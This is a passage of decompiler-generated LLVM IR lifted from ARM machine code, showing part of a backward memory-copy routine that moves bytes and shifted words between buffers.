  store i1 %v6_177b4, i1* %cpsr_n.global-to-local, align 1
  %v7_177b4 = icmp eq i32 %v1_177ac, 2
  store i1 %v7_177b4, i1* @cpsr_z, align 1
  %v0_177b8 = load i32, i32* @r1, align 4
  %v1_177b8 = add i32 %v0_177b8, -1
  %v2_177b8 = inttoptr i32 %v1_177b8 to i8*
  %v3_177b8 = load i8, i8* %v2_177b8, align 1
  %v4_177b8 = zext i8 %v3_177b8 to i32
  store i32 %v4_177b8, i32* %r3.global-to-local, align 4
  store i32 %v1_177b8, i32* @r1, align 4
  %v3_177bc = add i32 %v2_177b0, -1
  %v4_177bc = inttoptr i32 %v3_177bc to i8*
  store i8 %v3_177b8, i8* %v4_177bc, align 1
  %v5_177bc = load i32, i32* %r0.global-to-local, align 4
  %v6_177bc = add i32 %v5_177bc, -1
  store i32 %v6_177bc, i32* %r0.global-to-local, align 4
  %v0_177c0 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_177c0 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_177c0 = xor i1 %v0_177c0, %v1_177c0
  br i1 %v2_177c0, label %.thread121, label %bb144

bb144:                                            ; preds = %bb143
  %v3_177c0 = load i32, i32* @r1, align 4
  %v4_177c0 = add i32 %v3_177c0, -1
  %v5_177c0 = inttoptr i32 %v4_177c0 to i8*
  %v6_177c0 = load i8, i8* %v5_177c0, align 1
  %v7_177c0 = zext i8 %v6_177c0 to i32
  store i32 %v7_177c0, i32* %r3.global-to-local, align 4
  store i32 %v4_177c0, i32* @r1, align 4
  %v6_177c4 = add i32 %v5_177bc, -2
  %v7_177c4 = inttoptr i32 %v6_177c4 to i8*
  store i8 %v6_177c0, i8* %v7_177c4, align 1
  %v8_177c4 = load i32, i32* %r0.global-to-local, align 4
  %v9_177c4 = add i32 %v8_177c4, -1
  store i32 %v9_177c4, i32* %r0.global-to-local, align 4
  %v1_177c8.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_177c8.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread121

.thread121:                                       ; preds = %bb143, %bb144
  %v7_177cc = phi i32 [ %v9_177c4, %bb144 ], [ %v6_177bc, %bb143 ]
  %v2_177cc = phi i1 [ %v2_177c8.pre, %bb144 ], [ %v1_177c0, %bb143 ]
  %v1_177cc = phi i1 [ %v1_177c8.pre, %bb144 ], [ %v0_177c0, %bb143 ]
  %v0_177c8 = load i1, i1* @cpsr_z, align 1
  %v3_177c8 = xor i1 %v2_177cc, %v1_177cc
  %v4_177c8 = or i1 %v0_177c8, %v3_177c8
  br i1 %v4_177c8, label %.thread122, label %bb145

bb145:                                            ; preds = %.thread121
  %v5_177c8 = load i32, i32* @r1, align 4
  %v6_177c8 = add i32 %v5_177c8, -1
  %v7_177c8 = inttoptr i32 %v6_177c8 to i8*
  %v8_177c8 = load i8, i8* %v7_177c8, align 1
  %v9_177c8 = zext i8 %v8_177c8 to i32
  store i32 %v9_177c8, i32* %r3.global-to-local, align 4
  store i32 %v6_177c8, i32* @r1, align 4
  %v8_177cc = add i32 %v7_177cc, -1
  %v9_177cc = inttoptr i32 %v8_177cc to i8*
  store i8 %v8_177c8, i8* %v9_177cc, align 1
  %v10_177cc = load i32, i32* %r0.global-to-local, align 4
  %v11_177cc = add i32 %v10_177cc, -1
  store i32 %v11_177cc, i32* %r0.global-to-local, align 4
  br label %.thread122

dec_label_pc_177d4:                               ; preds = %dec_label_pc_1772c
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_177d4 = icmp eq i32 %v1_1772c, 1
  store i1 %v8_177d4, i1* %cpsr_n.global-to-local, align 1
  %v1_177d8 = add i32 %v2_1771c, -1
  %v2_177d8 = inttoptr i32 %v1_177d8 to i8*
  %v3_177d8 = load i8, i8* %v2_177d8, align 1
  %v4_177d8 = zext i8 %v3_177d8 to i32
  store i32 %v4_177d8, i32* %r3.global-to-local, align 4
  store i32 %v1_177d8, i32* @r1, align 4
  %v3_177dc = add i32 %v2_17720, -1
  %v4_177dc = inttoptr i32 %v3_177dc to i8*
  store i8 %v3_177d8, i8* %v4_177dc, align 1
  %v5_177dc = load i32, i32* %r0.global-to-local, align 4
  %v6_177dc = add i32 %v5_177dc, -1
  store i32 %v6_177dc, i32* %r0.global-to-local, align 4
  br i1 %v8_177d4, label %.thread25, label %bb146

bb146:                                            ; preds = %dec_label_pc_177d4
  %v9_177d4 = icmp eq i32 %v1_1772c, 2
  %v6_177e0 = load i32, i32* @r1, align 4
  %v7_177e0 = add i32 %v6_177e0, -1
  %v8_177e0 = inttoptr i32 %v7_177e0 to i8*
  %v9_177e0 = load i8, i8* %v8_177e0, align 1
  %v10_177e0 = zext i8 %v9_177e0 to i32
  store i32 %v10_177e0, i32* %r3.global-to-local, align 4
  store i32 %v7_177e0, i32* @r1, align 4
  %v9_177e4 = add i32 %v5_177dc, -2
  %v10_177e4 = inttoptr i32 %v9_177e4 to i8*
  store i8 %v9_177e0, i8* %v10_177e4, align 1
  %v11_177e4 = load i32, i32* %r0.global-to-local, align 4
  %v12_177e4 = add i32 %v11_177e4, -1
  store i32 %v12_177e4, i32* %r0.global-to-local, align 4
  br i1 %v9_177d4, label %.thread25, label %bb147

bb147:                                            ; preds = %bb146
  %v8_177e8 = load i32, i32* @r1, align 4
  %v9_177e8 = add i32 %v8_177e8, -1
  %v10_177e8 = inttoptr i32 %v9_177e8 to i8*
  %v11_177e8 = load i8, i8* %v10_177e8, align 1
  %v12_177e8 = zext i8 %v11_177e8 to i32
  store i32 %v12_177e8, i32* %r3.global-to-local, align 4
  store i32 %v9_177e8, i32* @r1, align 4
  %v11_177ec = add i32 %v11_177e4, -2
  %v12_177ec = inttoptr i32 %v11_177ec to i8*
  store i8 %v11_177e8, i8* %v12_177ec, align 1
  %v13_177ec = load i32, i32* %r0.global-to-local, align 4
  %v14_177ec = add i32 %v13_177ec, -1
  store i32 %v14_177ec, i32* %r0.global-to-local, align 4
  br label %.thread25

.thread25:                                        ; preds = %bb146, %dec_label_pc_177d4, %bb147
  %v0_1784831 = phi i32 [ %v12_177e4, %bb146 ], [ %v6_177dc, %dec_label_pc_177d4 ], [ %v14_177ec, %bb147 ]
  %v0_177f0 = load i32, i32* %r2.global-to-local, align 4
  %v1_177f0 = load i32, i32* @ip, align 4
  %v2_177f0 = sub i32 %v0_177f0, %v1_177f0
  store i32 %v2_177f0, i32* %r2.global-to-local, align 4
  %v4_177f0 = xor i32 %v1_177f0, %v0_177f0
  %v5_177f0 = xor i32 %v2_177f0, %v0_177f0
  %v6_177f0 = and i32 %v5_177f0, %v4_177f0
  %v7_177f0 = icmp slt i32 %v6_177f0, 0
  store i1 %v7_177f0, i1* %cpsr_v.global-to-local, align 1
  %v8_177f0 = icmp slt i32 %v2_177f0, 0
  store i1 %v8_177f0, i1* %cpsr_n.global-to-local, align 1
  %v5_177f4 = icmp slt i32 %v0_177f0, %v1_177f0
  br i1 %v5_177f4, label %bb142, label %dec_label_pc_177f8

dec_label_pc_177f8:                               ; preds = %.thread25
  %v0_177f8 = load i32, i32* @r1, align 4
  %v1_177f8 = urem i32 %v0_177f8, 4
  store i32 %v1_177f8, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_177f8 = icmp eq i32 %v1_177f8, 0
  br i1 %v2_177f8, label %dec_label_pc_1773c, label %dec_label_pc_17800

dec_label_pc_17800:                               ; preds = %dec_label_pc_17734, %dec_label_pc_177f8
  %v0_1784830 = phi i32 [ %v2_17720, %dec_label_pc_17734 ], [ %v0_1784831, %dec_label_pc_177f8 ]
  %v0_178f4 = phi i32 [ %v2_17724, %dec_label_pc_17734 ], [ %v2_177f0, %dec_label_pc_177f8 ]
  %v0_17800 = phi i32 [ %v2_1771c, %dec_label_pc_17734 ], [ %v0_177f8, %dec_label_pc_177f8 ]
  %v0_17808 = phi i32 [ %v1_17734, %dec_label_pc_17734 ], [ %v1_177f8, %dec_label_pc_177f8 ]
  %v1_17800 = and i32 %v0_17800, -4
  store i32 %v1_17800, i32* %r1.global-to-local, align 4
  %v1_17804 = inttoptr i32 %v1_17800 to i32*
  %v2_17804 = load i32, i32* %v1_17804, align 4
  store i32 %v2_17804, i32* %r3.global-to-local, align 4
  %v7_17808 = icmp ult i32 %v0_17808, 2
  %v2_178ec = add i32 %v0_178f4, -12
  %v4_178ec = sub i32 11, %v0_178f4
  %v5_178ec = and i32 %v4_178ec, %v0_178f4
  %v6_178ec = icmp slt i32 %v5_178ec, 0
  store i1 %v6_178ec, i1* %cpsr_v.global-to-local, align 1
  %v7_178ec = icmp slt i32 %v2_178ec, 0
  store i1 %v7_178ec, i1* %cpsr_n.global-to-local, align 1
  %v5_178f0 = icmp slt i32 %v0_178f4, 12
  br i1 %v7_17808, label %dec_label_pc_178ec, label %dec_label_pc_17810

dec_label_pc_17810:                               ; preds = %dec_label_pc_17800
  %v8_17808 = icmp eq i32 %v0_17808, 2
  br i1 %v8_17808, label %dec_label_pc_17880, label %dec_label_pc_17814

dec_label_pc_17814:                               ; preds = %dec_label_pc_17810
  br i1 %v5_178f0, label %dec_label_pc_17860, label %dec_label_pc_1781c

dec_label_pc_1781c:                               ; preds = %dec_label_pc_17814
  store i32 %v2_178ec, i32* %r2.global-to-local, align 4
  %v3_17820 = load i32, i32* @r4, align 4
  store i32 %v3_17820, i32* %stack_var_-12, align 4
  %v6_17820 = load i32, i32* @r5, align 4
  %v8_17820 = inttoptr i32 %v6_17820 to i8*
  store i8* %v8_17820, i8** %stack_var_-8, align 4
  %v11_17820 = load i32, i32* @lr, align 4
  br label %dec_label_pc_17824

dec_label_pc_17824:                               ; preds = %dec_label_pc_17824.dec_label_pc_17824_crit_edge, %dec_label_pc_1781c
  %v0_17848 = phi i32 [ %v1_17848, %dec_label_pc_17824.dec_label_pc_17824_crit_edge ], [ %v0_1784830, %dec_label_pc_1781c ]
  %v0_17828 = phi i32 [ %v0_17828.pre, %dec_label_pc_17824.dec_label_pc_17824_crit_edge ], [ %v1_17800, %dec_label_pc_1781c ]
  %v0_17824 = phi i32 [ %v0_17824.pre, %dec_label_pc_17824.dec_label_pc_17824_crit_edge ], [ %v2_17804, %dec_label_pc_1781c ]
  %v3_17824 = mul i32 %v0_17824, 256
  store i32 %v3_17824, i32* %lr.global-to-local, align 4
  %v1_17828 = add i32 %v0_17828, -4
  %v2_17828 = inttoptr i32 %v1_17828 to i32*
  %v3_17828 = load i32, i32* %v2_17828, align 4
  store i32 %v3_17828, i32* %r3.global-to-local, align 4
  %v4_17828 = add i32 %v0_17828, -8
  %v5_17828 = inttoptr i32 %v4_17828 to i32*
  %v6_17828 = load i32, i32* %v5_17828, align 4
  store i32 %v6_17828, i32* %r4.global-to-local, align 4
  %v7_17828 = add i32 %v0_17828, -12
  %v8_17828 = inttoptr i32 %v7_17828 to i32*
  %v9_17828 = load i32, i32* %v8_17828, align 4
  store i32 %v9_17828, i32* %r5.global-to-local, align 4
  %v10_17828 = add i32 %v0_17828, -16
  %v11_17828 = inttoptr i32 %v10_17828 to i32*
  %v12_17828 = load i32, i32* %v11_17828, align 4
  store i32 %v10_17828, i32* %r1.global-to-local, align 4
  %v4_1782c = udiv i32 %v12_17828, 16777216
  %v5_1782c = or i32 %v4_1782c, %v3_17824
  store i32 %v5_1782c, i32* %lr.global-to-local, align 4
  %v3_17830 = mul i32 %v12_17828, 256
  %v4_17834 = udiv i32 %v9_17828, 16777216
  %v5_17834 = or i32 %v3_17830, %v4_17834
  store i32 %v5_17834, i32* @ip, align 4
  %v3_17838 = mul i32 %v9_17828, 256
  %v4_1783c = udiv i32 %v6_17828, 16777216
  %v5_1783c = or i32 %v3_17838, %v4_1783c
  store i32 %v5_1783c, i32* %r5.global-to-local, align 4
  %v3_17840 = mul i32 %v6_17828, 256
  %v4_17844 = udiv i32 %v3_17828, 16777216
  %v5_17844 = or i32 %v3_17840, %v4_17844
  store i32 %v5_17844, i32* %r4.global-to-local, align 4
  %v1_17848 = add i32 %v0_17848, -16
  %v2_17848 = inttoptr i32 %v1_17848 to i32*
  store i32 %v5_17844, i32* %v2_17848, align 4
  %v4_17848 = add i32 %v0_17848, -12
  %v5_17848 = inttoptr i32 %v4_17848 to i32*
  %v6_17848 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_17848, i32* %v5_17848, align 4
  %v7_17848 = add i32 %v0_17848, -8
  %v8_17848 = inttoptr i32 %v7_17848 to i32*
  %v9_17848 = load i32, i32* @ip, align 4
  store i32 %v9_17848, i32* %v8_17848, align 4
  %v10_17848 = add i32 %v0_17848, -4
  %v11_17848 = inttoptr i32 %v10_17848 to i32*
  %v12_17848 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_17848, i32* %v11_17848, align 4
  store i32 %v1_17848, i32* %r0.global-to-local, align 4
  %v0_1784c = load i32, i32* %r2.global-to-local, align 4
  %v2_1784c = add i32 %v0_1784c, -16
  store i32 %v2_1784c, i32* %r2.global-to-local, align 4
  %v6_17850 = icmp slt i32 %v0_1784c, 16
  br i1 %v6_17850, label %dec_label_pc_17854, label %dec_label_pc_17824.dec_label_pc_17824_crit_edge

dec_label_pc_17824.dec_label_pc_17824_crit_edge:  ; preds = %dec_label_pc_17824
  %v0_17824.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_17828.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17824

dec_label_pc_17854:                               ; preds = %dec_label_pc_17824
  %v2_17854 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_17854, i32* @r4, align 4
  %v5_17854 = load i8*, i8** %stack_var_-8, align 4
  %v6_17854 = ptrtoint i8* %v5_17854 to i32
  store i32 %v6_17854, i32* @r5, align 4
  store i32 %v11_17820, i32* @lr, align 4
  %v2_17858 = add i32 %v0_1784c, -4
  store i32 %v2_17858, i32* %r2.global-to-local, align 4
  %v4_17858 = add i32 %v0_1784c, 2147483632
  %v5_17858 = and i32 %v2_17858, %v4_17858
  %v6_17858 = icmp slt i32 %v5_17858, 0
  store i1 %v6_17858, i1* %cpsr_v.global-to-local, align 1
  %v7_17858 = icmp slt i32 %v2_17858, 0
  store i1 %v7_17858, i1* %cpsr_n.global-to-local, align 1
  %v5_1785c = icmp slt i32 %v2_1784c, -12
  br i1 %v5_1785c, label %dec_label_pc_17878, label %dec_label_pc_17860

dec_label_pc_17860:                               ; preds = %dec_label_pc_17854, %dec_label_pc_17814, %dec_label_pc_17860
  %v1_1786c = phi i32 [ %v5_1786c, %dec_label_pc_17860 ], [ %v1_17848, %dec_label_pc_17854 ], [ %v0_1784830, %dec_label_pc_17814 ]
  %v0_17860 = load i32, i32* %r3.global-to-local, align 4
  %v3_17860 = mul i32 %v0_17860, 256
  store i32 %v3_17860, i32* %ip.global-to-local, align 4
  %v0_17864 = load i32, i32* %r1.global-to-local, align 4
  %v1_17864 = add i32 %v0_17864, -4
  %v2_17864 = inttoptr i32 %v1_17864 to i32*
  %v3_17864 = load i32, i32* %v2_17864, align 4
  store i32 %v3_17864, i32* %r3.global-to-local, align 4
  store i32 %v1_17864, i32* %r1.global-to-local, align 4
  %v4_17868 = udiv i32 %v3_17864, 16777216
  %v5_17868 = or i32 %v4_17868, %v3_17860
  store i32 %v5_17868, i32* @ip, align 4
  %v2_1786c = add i32 %v1_1786c, -4
  %v3_1786c = inttoptr i32 %v2_1786c to i32*
  store i32 %v5_17868, i32* %v3_1786c, align 4
  %v4_1786c = load i32, i32* %r0.global-to-local, align 4
  %v5_1786c = add i32 %v4_1786c, -4
  store i32 %v5_1786c, i32* %r0.global-to-local, align 4
  %v0_17870 = load i32, i32* %r2.global-to-local, align 4
  %v2_17870 = add i32 %v0_17870, -4
  store i32 %v2_17870, i32* %r2.global-to-local, align 4
  %v6_17874 = icmp slt i32 %v0_17870, 4
  br i1 %v6_17874, label %dec_label_pc_17878.loopexit, label %dec_label_pc_17860

dec_label_pc_17878.loopexit:                      ; preds = %dec_label_pc_17860
  %v4_17870 = sub i32 3, %v0_17870
  %v5_17870 = and i32 %v4_17870, %v0_17870
  %v6_17870 = icmp slt i32 %v5_17870, 0
  %v7_17870 = icmp slt i32 %v2_17870, 0
  store i1 %v6_17870, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_17870, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_17878

dec_label_pc_17878:                               ; preds = %dec_label_pc_17878.loopexit, %dec_label_pc_17854
  %v2_177bc62 = phi i32 [ %v5_1786c, %dec_label_pc_17878.loopexit ], [ %v1_17848, %dec_label_pc_17854 ]
  %v0_177ac58 = phi i32 [ %v2_17870, %dec_label_pc_17878.loopexit ], [ %v2_17858, %dec_label_pc_17854 ]
  %v0_17878 = load i32, i32* %r1.global-to-local, align 4
  %v1_17878 = add i32 %v0_17878, 3
  store i32 %v1_17878, i32* @r1, align 4
  br label %bb142

dec_label_pc_17880:                               ; preds = %dec_label_pc_17810
  br i1 %v5_178f0, label %dec_label_pc_178cc, label %dec_label_pc_17888

dec_label_pc_17888:                               ; preds = %dec_label_pc_17880
  store i32 %v2_178ec, i32* %r2.global-to-local, align 4
  %v3_1788c = load i32, i32* @r4, align 4
  store i32 %v3_1788c, i32* %stack_var_-12, align 4
  %v6_1788c = load i32, i32* @r5, align 4
  %v8_1788c = inttoptr i32 %v6_1788c to i8*
  store i8* %v8_1788c, i8** %stack_var_-8, align 4
  %v11_1788c = load i32, i32* @lr, align 4
  br label %dec_label_pc_17890

dec_label_pc_17890:                               ; preds = %dec_label_pc_17890.dec_label_pc_17890_crit_edge, %dec_label_pc_17888
  %v0_178b4 = phi i32 [ %v1_178b4, %dec_label_pc_17890.dec_label_pc_17890_crit_edge ], [ %v0_1784830, %dec_label_pc_17888 ]
  %v0_17894 = phi i32 [ %v0_17894.pre, %dec_label_pc_17890.dec_label_pc_17890_crit_edge ], [ %v1_17800, %dec_label_pc_17888 ]
  %v0_17890 = phi i32 [ %v0_17890.pre, %dec_label_pc_17890.dec_label_pc_17890_crit_edge ], [ %v2_17804, %dec_label_pc_17888 ]
  %v3_17890 = mul i32 %v0_17890, 65536
  store i32 %v3_17890, i32* %lr.global-to-local, align 4
  %v1_17894 = add i32 %v0_17894, -4
  %v2_17894 = inttoptr i32 %v1_17894 to i32*
  %v3_17894 = load i32, i32* %v2_17894, align 4
  store i32 %v3_17894, i32* %r3.global-to-local, align 4
  %v4_17894 = add i32 %v0_17894, -8
  %v5_17894 = inttoptr i32 %v4_17894 to i32*
  %v6_17894 = load i32, i32* %v5_17894, align 4
  store i32 %v6_17894, i32* %r4.global-to-local, align 4
  %v7_17894 = add i32 %v0_17894, -12
  %v8_17894 = inttoptr i32 %v7_17894 to i32*
  %v9_17894 = load i32, i32* %v8_17894, align 4
  store i32 %v9_17894, i32* %r5.global-to-local, align 4
  %v10_17894 = add i32 %v0_17894, -16
  %v11_17894 = inttoptr i32 %v10_17894 to i32*
  %v12_17894 = load i32, i32* %v11_17894, align 4
  store i32 %v10_17894, i32* %r1.global-to-local, align 4
  %v4_17898 = udiv i32 %v12_17894, 65536
  %v5_17898 = or i32 %v4_17898, %v3_17890
  store i32 %v5_17898, i32* %lr.global-to-local, align 4
  %v3_1789c = mul i32 %v12_17894, 65536
  %v4_178a0 = udiv i32 %v9_17894, 65536
  %v5_178a0 = or i32 %v3_1789c, %v4_178a0
  store i32 %v5_178a0, i32* @ip, align 4
  %v3_178a4 = mul i32 %v9_17894, 65536
  %v4_178a8 = udiv i32 %v6_17894, 65536
  %v5_178a8 = or i32 %v3_178a4, %v4_178a8
  store i32 %v5_178a8, i32* %r5.global-to-local, align 4
  %v3_178ac = mul i32 %v6_17894, 65536
  %v4_178b0 = udiv i32 %v3_17894, 65536
  %v5_178b0 = or i32 %v3_178ac, %v4_178b0
  store i32 %v5_178b0, i32* %r4.global-to-local, align 4
  %v1_178b4 = add i32 %v0_178b4, -16
  %v2_178b4 = inttoptr i32 %v1_178b4 to i32*
  store i32 %v5_178b0, i32* %v2_178b4, align 4
  %v4_178b4 = add i32 %v0_178b4, -12
  %v5_178b4 = inttoptr i32 %v4_178b4 to i32*
  %v6_178b4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_178b4, i32* %v5_178b4, align 4
  %v7_178b4 = add i32 %v0_178b4, -8
  %v8_178b4 = inttoptr i32 %v7_178b4 to i32*
  %v9_178b4 = load i32, i32* @ip, align 4
  store i32 %v9_178b4, i32* %v8_178b4, align 4
  %v10_178b4 = add i32 %v0_178b4, -4
  %v11_178b4 = inttoptr i32 %v10_178b4 to i32*
  %v12_178b4 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_178b4, i32* %v11_178b4, align 4
  store i32 %v1_178b4, i32* %r0.global-to-local, align 4
  %v0_178b8 = load i32, i32* %r2.global-to-local, align 4
  %v2_178b8 = add i32 %v0_178b8, -16
  store i32 %v2_178b8, i32* %r2.global-to-local, align 4
  %v6_178bc = icmp slt i32 %v0_178b8, 16
  br i1 %v6_178bc, label %dec_label_pc_178c0, label %dec_label_pc_17890.dec_label_pc_17890_crit_edge

dec_label_pc_17890.dec_label_pc_17890_crit_edge:  ; preds = %dec_label_pc_17890
  %v0_17890.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_17894.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17890

dec_label_pc_178c0:                               ; preds = %dec_label_pc_17890
  %v2_178c0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_178c0, i32* @r4, align 4
  %v5_178c0 = load i8*, i8** %stack_var_-8, align 4
  %v6_178c0 = ptrtoint i8* %v5_178c0 to i32
  store i32 %v6_178c0, i32* @r5, align 4
  store i32 %v11_1788c, i32* @lr, align 4
  %v2_178c4 = add i32 %v0_178b8, -4
  store i32 %v2_178c4, i32* %r2.global-to-local, align 4
  %v4_178c4 = add i32 %v0_178b8, 2147483632
  %v5_178c4 = and i32 %v2_178c4, %v4_178c4
  %v6_178c4 = icmp slt i32 %v5_178c4, 0
  store i1 %v6_178c4, i1* %cpsr_v.global-to-local, align 1
  %v7_178c4 = icmp slt i32 %v2_178c4, 0
  store i1 %v7_178c4, i1* %cpsr_n.global-to-local, align 1
  %v5_178c8 = icmp slt i32 %v2_178b8, -12
  br i1 %v5_178c8, label %dec_label_pc_178e4, label %dec_label_pc_178cc

dec_label_pc_178cc:                               ; preds = %dec_label_pc_178c0, %dec_label_pc_17880, %dec_label_pc_178cc
  %v1_178d8 = phi i32 [ %v5_178d8, %dec_label_pc_178cc ], [ %v1_178b4, %dec_label_pc_178c0 ], [ %v0_1784830, %dec_label_pc_17880 ]
  %v0_178cc = load i32, i32* %r3.global-to-local, align 4
  %v3_178cc = mul i32 %v0_178cc, 65536
  store i32 %v3_178cc, i32* %ip.global-to-local, align 4
  %v0_178d0 = load i32, i32* %r1.global-to-local, align 4
  %v1_178d0 = add i32 %v0_178d0, -4
  %v2_178d0 = inttoptr i32 %v1_178d0 to i32*
  %v3_178d0 = load i32, i32* %v2_178d0, align 4
  store i32 %v3_178d0, i32* %r3.global-to-local, align 4
  store i32 %v1_178d0, i32* %r1.global-to-local, align 4
  %v4_178d4 = udiv i32 %v3_178d0, 65536
  %v5_178d4 = or i32 %v4_178d4, %v3_178cc
  store i32 %v5_178d4, i32* @ip, align 4
  %v2_178d8 = add i32 %v1_178d8, -4
  %v3_178d8 = inttoptr i32 %v2_178d8 to i32*
  store i32 %v5_178d4, i32* %v3_178d8, align 4
  %v4_178d8 = load i32, i32* %r0.global-to-local, align 4
  %v5_178d8 = add i32 %v4_178d8, -4
  store i32 %v5_178d8, i32* %r0.global-to-local, align 4
  %v0_178dc = load i32, i32* %r2.global-to-local, align 4
  %v2_178dc = add i32 %v0_178dc, -4
  store i32 %v2_178dc, i32* %r2.global-to-local, align 4
  %v6_178e0 = icmp slt i32 %v0_178dc, 4
  br i1 %v6_178e0, label %dec_label_pc_178e4.loopexit, label %dec_label_pc_178cc

dec_label_pc_178e4.loopexit:                      ; preds = %dec_label_pc_178cc
  %v4_178dc = sub i32 3, %v0_178dc
  %v5_178dc = and i32 %v4_178dc, %v0_178dc
  %v6_178dc = icmp slt i32 %v5_178dc, 0
  %v7_178dc = icmp slt i32 %v2_178dc, 0
  store i1 %v6_178dc, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_178dc, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_178e4

dec_label_pc_178e4:                               ; preds = %dec_label_pc_178e4.loopexit, %dec_label_pc_178c0
  %v2_177bc63 = phi i32 [ %v5_178d8, %dec_label_pc_178e4.loopexit ], [ %v1_178b4, %dec_label_pc_178c0 ]
  %v0_177ac59 = phi i32 [ %v2_178dc, %dec_label_pc_178e4.loopexit ], [ %v2_178c4, %dec_label_pc_178c0 ]
  %v0_178e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_178e4 = add i32 %v0_178e4, 2
  store i32 %v1_178e4, i32* @r1, align 4
  br label %bb142

dec_label_pc_178ec:                               ; preds = %dec_label_pc_17800
  br i1 %v5_178f0, label %dec_label_pc_17938, label %dec_label_pc_178f4

dec_label_pc_178f4:                               ; preds = %dec_label_pc_178ec
  store i32 %v2_178ec, i32* %r2.global-to-local, align 4
  %v3_178f8 = load i32, i32* @r4, align 4
  store i32 %v3_178f8, i32* %stack_var_-12, align 4
  %v6_178f8 = load i32, i32* @r5, align 4
  %v8_178f8 = inttoptr i32 %v6_178f8 to i8*
  store i8* %v8_178f8, i8** %stack_var_-8, align 4
  %v11_178f8 = load i32, i32* @lr, align 4
  br label %dec_label_pc_178fc

dec_label_pc_178fc:                               ; preds = %dec_label_pc_178fc.dec_label_pc_178fc_crit_edge, %dec_label_pc_178f4
  %v0_17920 = phi i32 [ %v1_17920, %dec_label_pc_178fc.dec_label_pc_178fc_crit_edge ], [ %v0_1784830, %dec_label_pc_178f4 ]
  %v0_17900 = phi i32 [ %v0_17900.pre, %dec_label_pc_178fc.dec_label_pc_178fc_crit_edge ], [ %v1_17800, %dec_label_pc_178f4 ]
  %v0_178fc = phi i32 [ %v0_178fc.pre, %dec_label_pc_178fc.dec_label_pc_178fc_crit_edge ], [ %v2_17804, %dec_label_pc_178f4 ]
  %v3_178fc = mul i32 %v0_178fc, 16777216
  store i32 %v3_178fc, i32* %lr.global-to-local, align 4
  %v1_17900 = add i32 %v0_17900, -4
  %v2_17900 = inttoptr i32 %v1_17900 to i32*
  %v3_17900 = load i32, i32* %v2_17900, align 4
  store i32 %v3_17900, i32* %r3.global-to-local, align 4
  %v4_17900 = add i32 %v0_17900, -8
  %v5_17900 = inttoptr i32 %v4_17900 to i32*
  %v6_17900 = load i32, i32* %v5_17900, align 4
  store i32 %v6_17900, i32* %r4.global-to-local, align 4
  %v7_17900 = add i32 %v0_17900, -12
  %v8_17900 = inttoptr i32 %v7_17900 to i32*
  %v9_17900 = load i32, i32* %v8_17900, align 4
  store i32 %v9_17900, i32* %r5.global-to-local, align 4
  %v10_17900 = add i32 %v0_17900, -16
  %v11_17900 = inttoptr i32 %v10_17900 to i32*
  %v12_17900 = load i32, i32* %v11_17900, align 4
  store i32 %v10_17900, i32* %r1.global-to-local, align 4
  %v4_17904 = udiv i32 %v12_17900, 256
  %v5_17904 = or i32 %v4_17904, %v3_178fc
  store i32 %v5_17904, i32* %lr.global-to-local, align 4
  %v3_17908 = mul i32 %v12_17900, 16777216
  %v4_1790c = udiv i32 %v9_17900, 256
  %v5_1790c = or i32 %v3_17908, %v4_1790c
  store i32 %v5_1790c, i32* @ip, align 4
  %v3_17910 = mul i32 %v9_17900, 16777216
  %v4_17914 = udiv i32 %v6_17900, 256
  %v5_17914 = or i32 %v3_17910, %v4_17914
  store i32 %v5_17914, i32* %r5.global-to-local, align 4
  %v3_17918 = mul i32 %v6_17900, 16777216
  %v4_1791c = udiv i32 %v3_17900, 256
  %v5_1791c = or i32 %v3_17918, %v4_1791c
  store i32 %v5_1791c, i32* %r4.global-to-local, align 4
  %v1_17920 = add i32 %v0_17920, -16
  %v2_17920 = inttoptr i32 %v1_17920 to i32*
  store i32 %v5_1791c, i32* %v2_17920, align 4
  %v4_17920 = add i32 %v0_17920, -12
  %v5_17920 = inttoptr i32 %v4_17920 to i32*
  %v6_17920 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_17920, i32* %v5_17920, align 4
  %v7_17920 = add i32 %v0_17920, -8
  %v8_17920 = inttoptr i32 %v7_17920 to i32*
  %v9_17920 = load i32, i32* @ip, align 4
  store i32 %v9_17920, i32* %v8_17920, align 4
  %v10_17920 = add i32 %v0_17920, -4
  %v11_17920 = inttoptr i32 %v10_17920 to i32*
  %v12_17920 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_17920, i32* %v11_17920, align 4
  store i32 %v1_17920, i32* %r0.global-to-local, align 4
  %v0_17924 = load i32, i32* %r2.global-to-local, align 4
  %v2_17924 = add i32 %v0_17924, -16
  store i32 %v2_17924, i32* %r2.global-to-local, align 4
  %v6_17928 = icmp slt i32 %v0_17924, 16
  br i1 %v6_17928, label %dec_label_pc_1792c, label %dec_label_pc_178fc.dec_label_pc_178fc_crit_edge

dec_label_pc_178fc.dec_label_pc_178fc_crit_edge:  ; preds = %dec_label_pc_178fc
  %v0_178fc.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_17900.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_178fc

dec_label_pc_1792c:                               ; preds = %dec_label_pc_178fc
  %v2_1792c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1792c, i32* @r4, align 4
  %v5_1792c = load i8*, i8** %stack_var_-8, align 4
  %v6_1792c = ptrtoint i8* %v5_1792c to i32
  store i32 %v6_1792c, i32* @r5, align 4
